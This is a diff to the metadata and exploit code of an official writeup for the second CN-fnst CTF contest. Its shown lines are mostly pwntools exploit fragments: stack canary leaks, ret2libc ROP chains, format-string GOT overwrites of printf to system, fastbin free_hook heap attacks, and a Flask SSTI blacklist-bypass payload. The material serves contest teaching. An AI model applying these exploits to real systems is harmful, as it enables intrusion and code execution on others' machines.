@@ -15,7 +15,22 @@ tags:
 - Sandbox-shellcode
 - RE-XOR
 - Crypto-RSA
-attack_chain: 钓鱼执法反作弊→key.html歌词数字提hex→silenteye音频隐写→二十八星宿四象限→玄武00青龙01白虎10朱雀11二进制解flag→Flask SSTI unicode十六进制属性名绕黑名单→canary+ret2libc栈溢出ROP→fmtstr_payload覆盖got→seccomp openat+read+write shellcode→fastbin attack free_hook→凯撒密码1位移→UPX脱壳+XOR key爆破→RSA yafu分解n→dp泄露构造φ→2331位01序列合法状态DP
+attack_chain:
+- '钓鱼执法反作弊'
+- 'key.html歌词数字提hex'
+- 'silenteye音频隐写'
+- '二十八星宿四象限'
+- '玄武00青龙01白虎10朱雀11二进制解flag'
+- 'Flask SSTI unicode十六进制属性名绕黑名单'
+- 'canary+ret2libc栈溢出ROP'
+- 'fmtstr_payload覆盖got'
+- 'seccomp openat+read+write shellcode'
+- 'fastbin attack free_hook'
+- '凯撒密码1位移'
+- 'UPX脱壳+XOR key爆破'
+- 'RSA yafu分解n'
+- 'dp泄露构造φ'
+- '2331位01序列合法状态DP'
 key_payload: 'flag{BaguA_M4ster_0v0}|{%print g[''pop''][(''_''*2)|attr("x5fx5faddx5fx5f")(''globals'')...%}|b''a''*(0x8*3-1)+b''Z''+p(canary)+prdi+...+p(0x400737)|fmtstr_payload(8, {elf.got["exit"]: p(elf.sym["main"])})+fmtstr_payload(8, {elf.got["printf"]: p(system)})+b''/bin/sh\x00'''
 one_liner: 公益赛事998人注册584队参赛,反作弊在某鱼钓鱼执法+14题覆盖Misc隐写音频四象限二进制/Flask SSTI黑名单绕/canary栈溢出ROP/格式化字符串盖got/seccomp openat shellcode/fastbin free_hook/凯撒+图片隐写/UPX脱壳+XOR爆破/RSA yafu/DP泄露/2331位状态DP
 lesson: '1) Flask SSTI WAF可读源文件后用十六进制属性名x5fx5faddx5fx5f绕黑名单(''__add__''→''x5fx5faddx5fx5f''); 2) 栈溢出canary末字节必为\x00爆破1字节绕过; 3) fmtstr_payload(offset, {got: value})两步覆盖exit→main循环+printf→system; 4) seccomp禁execve时用openat+read+write纯汇编ORW; 5) tcache下fake_fast布置后backdoor地址前置; 6) RSA已知dp可直接计算p: e*dp ≡ 1 (mod p-1) → p = e*dp - 1 + k*((e*dp-1)//(k+1))... 7) 二十八星宿四象限编码本质是2bit/字符的二进制编码'
@@ -65,6 +80,9 @@ prerequisites:
 - seccomp 系统调用限制绕过（ORW shellcode）
 - RSA dp 泄露攻击（已知 dp 求 p）
 - 格式化字符串 got 表两步覆盖
+contest_normalized: "CN-fnst--CTF"
+contest_year: 2024
+subcategory_guess: "ssti"
 ---
 # 第二届CN-fnst::
 CTF官方writeup
@@ -269,7 +287,7 @@ payload = b"a" * (0x8 * 3 - 1) + b"Z"
 
 sl(payload)
 ru(b"Zn")
-canary = u(r(7).rjust(8, b" "))
+canary = u(r(7).rjust(8, b"\\x00"))
 success(hex(canary))
 ru(b"Say something: ")
 payload = (
@@ -283,7 +301,7 @@ payload = (
 )
 
 sl(payload)
-leak_got = u(r(6).ljust(8, b" "))
+leak_got = u(r(6).ljust(8, b"\\x00"))
 
 success(hex(leak_got))
 base = leak_got - 0x110020
@@ -300,7 +318,7 @@ payload = (
     + p(system)
 )
 ru(b"Enter your name: ")
-sl(b"/bin/sh ")
+sl(b"/bin/sh\\x00")
 ru(b"Introduce yourself: ")
 sl(b"1")
 ru(b"Say something: ")
@@ -433,7 +451,7 @@ alloc(2, 0x60, b"aa")
 edit(0, 0, b"")
 show(0)
 ru(b"0: ")
-leak = u(r(6).ljust(8, b" "))
+leak = u(r(6).ljust(8, b"\\x00"))
 
 # free_hook = leak + 0x01C30
 fake_fast = leak - 0x7B
@@ -509,7 +527,7 @@ edit(0, payload)
 show(0)
 ru(b"Z")
 
-heap0 = u(r(4).ljust(8, b" ")) - 0xC0
+heap0 = u(r(4).ljust(8, b"\\x00")) - 0xC0
 heap_base = heap0 - 0x490
 success(hex(heap_base))
 
@@ -524,7 +542,7 @@ payload = b"a" * 8 * 5 + b"a" * 7 + b"Z"
 edit(0, payload)
 show(0)
 ru(b"Z")
-leak = u(r(6).ljust(8, b" "))
+leak = u(r(6).ljust(8, b"\\x00"))
 leak -= 0x3C3B78
 success(hex(leak))
 fake_fast = leak + 0x3C3AED
@@ -1074,7 +1092,7 @@ payload = b"a" * (0x8 * 3 - 1) + b"Z"
 
 sl(payload)
 ru(b"Zn")
-canary = u(r(7).rjust(8, b" "))
+canary = u(r(7).rjust(8, b"\\x00"))
 success(hex(canary))
 ru(b"Say something: ")
 payload = (
@@ -1088,7 +1106,7 @@ payload = (
 )
 
 sl(payload)
-leak_got = u(r(6).ljust(8, b" "))
+leak_got = u(r(6).ljust(8, b"\\x00"))
 
 success(hex(leak_got))
 base = leak_got - 0x110020
@@ -1105,7 +1123,7 @@ payload = (
     + p(system)
 )
 ru(b"Enter your name: ")
-sl(b"/bin/sh ")
+sl(b"/bin/sh\\x00")
 ru(b"Introduce yourself: ")
 sl(b"1")
 ru(b"Say something: ")
@@ -1226,7 +1244,7 @@ alloc(2, 0x60, b"aa")
 edit(0, 0, b"")
 show(0)
 ru(b"0: ")
-leak = u(r(6).ljust(8, b" "))
+leak = u(r(6).ljust(8, b"\\x00"))
 
 # free_hook = leak + 0x01C30
 fake_fast = leak - 0x7B
@@ -1299,7 +1317,7 @@ edit(0, payload)
 show(0)
 ru(b"Z")
 
-heap0 = u(r(4).ljust(8, b" ")) - 0xC0
+heap0 = u(r(4).ljust(8, b"\\x00")) - 0xC0
 heap_base = heap0 - 0x490
 success(hex(heap_base))
 
@@ -1314,7 +1332,7 @@ payload = b"a" * 8 * 5 + b"a" * 7 + b"Z"
 edit(0, payload)
 show(0)
 ru(b"Z")
-leak = u(r(6).ljust(8, b" "))
+leak = u(r(6).ljust(8, b"\\x00"))
 leak -= 0x3C3B78
 success(hex(leak))
 fake_fast = leak + 0x3C3AED
